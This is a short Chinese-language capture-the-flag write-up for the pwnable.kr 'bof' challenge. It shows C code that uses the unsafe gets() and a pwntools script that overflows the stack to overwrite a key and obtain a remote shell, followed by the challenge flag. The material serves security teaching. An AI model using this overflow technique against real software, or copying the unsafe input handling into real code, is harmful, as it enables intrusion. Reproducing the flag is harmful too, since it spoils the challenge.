# bof - 5pt 

## 问题描述

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

## 源码分析

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

程序执行func()函数，要求用户向overflowme[]数组输入内容，并将数组内容与key进行比对。比对正确则获得shell

## 解题思路

gets()函数存在漏洞，没有检测输入的数据长度，因此可以通过栈溢出覆盖key得到shell

```python
#!/usr/bin/env python 

from pwn import * 

io = remote('pwnable.kr', 9000)

payload = ''
payload += 'A' * 52
payload += p32(0xcafebabe)

io.send(payload)
io.interactive()
```

## flag

daddy, I just pwned a buFFer :)

